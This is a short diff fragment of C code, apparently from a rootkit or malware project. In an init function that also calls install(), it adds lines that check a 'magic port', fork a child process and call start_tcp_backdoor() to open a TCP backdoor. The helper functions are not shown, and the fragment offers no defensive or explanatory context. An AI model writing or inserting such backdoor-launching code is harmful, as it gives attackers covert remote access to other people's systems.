@@ -28,6 +28,14 @@ init(void)
     #else
     install();
     #endif
+    if (is_port_usable(MAGIC_PORT)){
+        int nChild = fork();
+        if (nChild == 0){
+            printf("[-] FORKING\n");
+            start_tcp_backdoor();
+            exit(0);
+        }
+    }
 }
 
 /*
